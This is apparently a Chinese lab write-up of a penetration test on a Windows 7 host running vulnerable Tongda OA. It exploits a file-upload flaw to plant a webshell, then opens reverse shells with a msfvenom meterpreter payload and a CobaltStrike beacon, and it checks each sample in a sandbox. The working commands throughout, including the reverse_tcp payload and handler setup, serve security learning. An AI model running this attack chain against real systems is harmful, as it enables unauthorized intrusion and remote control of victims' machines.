---
title: 反连实验
date: 2026-11-05 15:00:00
categories:
  - [技术, 安全]
tags: [安全, 渗透测试, 反连, CobaltStrike]
---

## 一、准备

靶机：Windows7

运行：通达OA（存在漏洞）

## 二、渗透测试

### 1. 信息收集

这里使用 fscan 工具扫描 kali 和 靶机 所属网段

```bash
./fscan_2.2.2_linux_x64 -h 10.43.55.0/24 -np 
```

![fscan 扫到通达OA 漏洞](/img/posts/reverse-shell/01-fscan.webp)

目标存在 通达OA 漏洞

### 2. 漏洞利用

#### 方法一：

既然如此，接下来使用 通达OA漏洞检测工具 扫描是否存在可利用 payload

![通达OA 漏洞检测工具批量检测结果](/img/posts/reverse-shell/02-tongda-detect.webp)

利用（Tongda_Ispirit_AnyFileUpload）漏洞，发送木马


```
[+]http://10.43.55.160存在通达OA ispirit后台任意文件上传漏洞(Tongda_Ispirit_AnyFileUpload)
蚁剑:http://10.43.55.160/im/2611/******.php
密码:******
编码器:base64
```

接着用 蚁剑 连接

![蚁剑连上 webshell](/img/posts/reverse-shell/04-antsword.webp)

成功

小实验：微步云沙箱检测脚本：[微步在线云沙箱](https://s.threatbook.com/)

将我们创建的木马进行检测分析

![提交样本到微步云沙箱](/img/posts/reverse-shell/05-sandbox-upload.webp)

![沙箱判定为 PHP WebShell 后门](/img/posts/reverse-shell/06-sandbox-php.webp)

#### 方法二：

使用 Msfvenom 工具生成木马攻击

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.43.55.249 LPORT=5000 -f exe -o ./payload.exe
```

将 木马 发送到靶机（详情见方法一）：

![通过蚁剑上传 payload.exe](/img/posts/reverse-shell/07-upload-payload.webp)

上传后在 蚁剑 打开终端，运行木马

![在靶机上运行 payload.exe](/img/posts/reverse-shell/08-run-payload.webp)

回到 kali ，需要借助 msfconsole 连接（开启接受端）

```bash
msfconsole

msf > search multi/handler

msf > use exploit/multi/handler 

msf exploit(multi/handler) > options

msf exploit(multi/handler) > set lhost 10.43.55.249

msf exploit(multi/handler) > set lport 5000

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp

msf exploit(multi/handler) > run
```

![msf 端成功收到反连](/img/posts/reverse-shell/09-msf-handler.webp)

成功连上

分析：上传的木马，目标机器主动连接攻击者服务器（反连）

小实验：微步云沙箱检测脚本：[微步在线云沙箱](https://s.threatbook.com/)

![沙箱的多引擎检出情况](/img/posts/reverse-shell/10-sandbox-ioc.webp)

#### 方法三：

使用 CobaltStrike 工具

创建 监听 （此时 kali 为跳板机）

```bash
./teamserver 10.43.55.249 ******   # ./teamserver <ip> <密码>   
```

在 客户机 上接收：

![CobaltStrike 客户端连接 teamserver](/img/posts/reverse-shell/11-cs-connect.webp)

![配置监听器](/img/posts/reverse-shell/12-cs-listener.webp)

根据 靶机（win7）类型，创建木马

![生成 Windows 可执行程序](/img/posts/reverse-shell/13-cs-payload.webp)

同理，借助 蚁剑 上传木马并运行

![上传 artifact_x64.exe 到靶机](/img/posts/reverse-shell/14-cs-upload.webp)

成功监听到 目标机器

![CobaltStrike 会话列表拿到 SYSTEM](/img/posts/reverse-shell/15-cs-session.webp)

```bash
beacon > shell ipconfig
```

```bash

received output:

Windows IP 配置

以太网适配器 Bluetooth 网络连接:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

以太网适配器 本地连接 2:

   连接特定的 DNS 后缀 . . . . . . . : 
   本地链接 IPv6 地址. . . . . . . . : fe80::bced:f539:e4cd:3193%13
   IPv4 地址 . . . . . . . . . . . . : 10.0.20.98
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 

以太网适配器 本地连接:

   连接特定的 DNS 后缀 . . . . . . . : 
   IPv6 地址 . . . . . . . . . . . . : ******
   临时 IPv6 地址. . . . . . . . . . : ******
   本地链接 IPv6 地址. . . . . . . . : fe80::ccf8:2ce4:5305:dd99%11
   IPv4 地址 . . . . . . . . . . . . : 10.43.55.160
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : fe80::d8a9:7dff:fe7b:8060%11
                                       10.43.55.167

隧道适配器 isatap.{88C7D474-A9AD-4240-ADA1-2ADAD30C0900}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{0EECF21A-AF38-44FF-B9D1-AA7055B9B9AA}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 

隧道适配器 isatap.{C16C4D2C-F074-4634-A62D-2B70BC241EE5}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . : 
```

小实验：微步云沙箱检测脚本：[微步在线云沙箱](https://s.threatbook.com/)

![沙箱判定样本属 CobaltStrike 木马家族](/img/posts/reverse-shell/16-sandbox-cs.webp)
